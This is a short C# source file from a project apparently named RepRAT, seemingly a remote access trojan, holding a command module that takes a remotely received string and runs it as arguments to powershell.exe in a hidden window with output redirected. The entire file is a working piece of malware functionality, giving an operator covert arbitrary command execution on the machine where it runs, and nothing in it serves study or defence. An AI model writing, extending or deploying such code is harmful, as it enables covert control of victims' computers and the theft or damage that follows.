using System.Diagnostics;

namespace RepRAT.Commands.exec_powershell;

public class Main
{
    //Help:
    //powershell ARGS -> powershell.exe ARGS
    public static void exec(string command)
    {
        var args = command.Replace("exec_powershell ", "");
        Debug.WriteLine(args);
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = @"powershell.exe";
        startInfo.Arguments = args;
        startInfo.RedirectStandardOutput = true;
        startInfo.RedirectStandardError = true;
        startInfo.UseShellExecute = false;
        startInfo.CreateNoWindow = true;
        Process process = new Process();
        process.StartInfo = startInfo;
        process.Start();
    }
}